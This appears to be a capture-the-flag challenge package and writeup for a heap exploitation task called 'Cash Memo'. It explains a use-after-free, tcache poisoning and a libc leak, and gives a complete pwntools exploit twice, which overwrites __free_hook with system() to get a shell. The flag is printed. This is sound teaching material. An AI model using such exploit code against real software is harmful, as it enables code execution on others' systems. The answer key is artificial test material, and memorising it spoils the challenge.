# Cash Memo [pwn]

## 問題概要

# Cash Memo

I have a really hard time managing my cash, am afraid someone might steal my memos...

`difficulty: hard`

`author: the_moon_guy`

## Flag
```
EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}
```

## Solution

You have to "write, what where" by exploiting Tcache Poisoning and overwrite the __free_hook to call system()

The Solution script is at `./admin/solution/solve.py`.

Basically, you have to exploit the Tcache Bin to write at a specific address. When we free a malloced memory, it is stored in the Tcache Bin which is a linked list. It can be exploited to write at any specific address. 

After that we have to make a glibc leak to find the address of __free_hook. __free_hook is a kind of debug feature in old libc, which executes the function whose address is in the __free_hook whenever free() is called.

We make the glibc with the help of Unsorted Bins which stores the addresses of freed malloc spaces larger than `0x420`. This is a double linked list which points back to the libc.

Then we just write the address of system() inside __free_hook and free a memory location which has `/bin/sh` in it, and get the system shell.

## Making Challenge

Had to attend a week of some random prof's university lectures 0_0 (bro's pretty good at teaching stuff)

---

## Writeup

# Cash Memo Writeup

**Challenge Text:** I have a really hard time managing my cash, am afraid someone might steal my memos...

**Author:** `the_moon_guy`

The Following File were in the handout:
- chall
- libc-2.31.so
- ld-2.31.so


First all we will have to change the default libc of the binary to maintain consistency of offsets and addresses we get from the file. (Rename the libc-2.31.so to libc.so.6)

```bash
patchelf --set-interpreter ./ld-2.31.so --set-rpath . chall
```

We can check if the libc has been changed by executing the command `ldd ./chall`

Now on executing the binary we can see that we are getting option to allocate memory, write data in it, delete the data and view it.


```bash
You are using 0/100 chunk addresses.
1. New
2. Delete
3. Edit 
4. View data
5. Exit
> 
```

On decompiling the code we can see that it is allocating memory in the heap.
```c
void main(void)

{
  long in_FS_OFFSET;
  undefined4 local_14;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    setvbuf(stdin,(char *)0x0,2,1);
    setvbuf(stdout,(char *)0x0,2,1);
    setvbuf(stderr,(char *)0x0,2,1);
    printf(menu,(ulong)space);
    __isoc99_scanf(&DAT_00102014,&local_14);
    getchar();
    switch(local_14) {
    case 1:
      mallocc();
      break;
    case 2:
      freee();
      break;
    case 3:
      edit();
      break;
    case 4:
      view();
      break;
    case 5:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```


```c
undefined8 mallocc(void)

{
  int iVar1;
  void *pvVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  int local_28;
  int local_24;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  printf("which index?\n> ");
  __isoc99_scanf(&DAT_00102014,&local_28);
  getchar();
  printf("how big?\n> ");
  __isoc99_scanf(&DAT_00102014,&local_24);
  getchar();
  iVar1 = local_28;
  if ((local_28 < 0) || (99 < local_28)) {
    puts("Invalid request");
    uVar3 = 1;
  }
  else {
    pvVar2 = malloc((long)local_24);
    *(void **)(arr + (long)iVar1 * 8) = pvVar2;
    *(int *)(arr_size + (long)local_28 * 4) = local_24;
    space = space + 1;
    printf("first payload?\n> ");
    fgets(*(char **)(arr + (long)local_28 * 8),local_24,stdin);
    uVar3 = 0;
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

```c
undefined8 freee(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("which index?\n> ");
  __isoc99_scanf(&DAT_00102014,&local_14);
  getchar();
  if ((local_14 < 0) || (99 < local_14)) {
    puts("Invalid request");
    uVar1 = 1;
  }
  else {
    free(*(void **)(arr + (long)local_14 * 8));
    space = space + -1;
    uVar1 = 0;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar1;
}
```

If we focus on the decompiled view of freee() function we can notice that the pointer is not being assigned a NULL value after free. This gives birth to a UAF vulnerability.

The intended solution for this challenge is meant to se Tcache Bin Poisoning to **"Write, What, Where"** and write the address of `system()` in the `__free_hook` and when we `free()` a memory chunk which has `/bin/sh` written in it, we can execute `system(/bin/sh)` when we free a memory location.

*You can study about Tcache Bin Poisoning from the following source for better clarification:
 https://capture.udel.edu/media/Write-what-where+in+the+Heap%2C+intro+to+tcache+poisoning+/1_4xovnkum*

This also involves leaking a libc address using Unsorted Bins as memory chunks larger than `0x421` size are stored in Unsorted Bins when they are freed and as Unsorted Bins is a soubly linked list pointing back to the libc, we successfully leak a glibc address and thus can now get offset for system() to write it's address into `__free_hook` and then when we call `free()`, `/bin/sh` will be called along with it.

```python
from pwn import *

exe = ELF("chall")
libc = ELF("libc.so.6")

p = process("./chall_patched")
# p = remote("localhost", 1925)

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def getleak(resp):
    rleak = resp.split(b"index?\n> ")[1].split(b"\nYou ")[0]
    return u64(rleak.ljust(8, b"\x00"))

system_offset = libc.symbols['system']
print(f"system offset: {hex(system_offset)}")

main_arena_96_offset_from_base = 0x1ecbe0
main_arena_96_system_offset = 0x19a950
free_hook_main_arena_96_offset = 0x2268


malloc(0, 1049, b"Thicc ass boi")
malloc(1, 24, b"malloc1")
malloc(2, 24, b"malloc2")
malloc(3, 24, b"/bin/sh\x00")
malloc(4, 24, b"border")
free(0) #glibc leak
main_arena_leak = getleak(view(0))

view(0)
print(f"main arena leak: {hex(main_arena_leak)}")

system_address = main_arena_leak - main_arena_96_system_offset
free_hook_address = main_arena_leak + free_hook_main_arena_96_offset


print(f"Free Hook Address: {hex(free_hook_address)}")
print(f"System Address: {hex(system_address)}")
free(1) #1
free(2) #2 -> 1
edit(2, p64(free_hook_address))
malloc(5, 24, b"we beck")
malloc(6, 24, p64(system_address))
free(3)

p.interactive()
```


Then we get the system shell of the remote machine and then can simply `cat flag.txt` and get the flag, which was 
```
EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}
```

---

## 解法スクリプト: solve.py

```python
from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

exe = ELF("chall")
libc = ELF("libc.so.6")

# context.terminal = ['tmux', 'splitw', '-h']
# p = process("./chall_patched")
p = remote("localhost", 1925)
# p=gdb.debug("./chall", gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def getleak(resp):
    rleak = resp.split(b"index?\n> ")[1].split(b"\nYou ")[0]
    return u64(rleak.ljust(8, b"\x00"))

system_offset = libc.symbols['system']
print(f"system offset: {hex(system_offset)}")

main_arena_96_offset_from_base = 0x1ecbe0
main_arena_96_system_offset = 0x19a950
free_hook_main_arena_96_offset = 0x2268


malloc(0, 1049, b"Thicc ass boi")
malloc(1, 24, b"malloc1")
malloc(2, 24, b"malloc2")
malloc(3, 24, b"/bin/sh\x00")
malloc(4, 24, b"border")
free(0) #glibc leak
main_arena_leak = getleak(view(0))

view(0)
print(f"main arena leak: {hex(main_arena_leak)}")

system_address = main_arena_leak - main_arena_96_system_offset
free_hook_address = main_arena_leak + free_hook_main_arena_96_offset


print(f"Free Hook Address: {hex(free_hook_address)}")
print(f"System Address: {hex(system_address)}")
free(1) #1
free(2) #2 -> 1
edit(2, p64(free_hook_address))
malloc(5, 24, b"we beck")
malloc(6, 24, p64(system_address))
free(3)

p.interactive()
```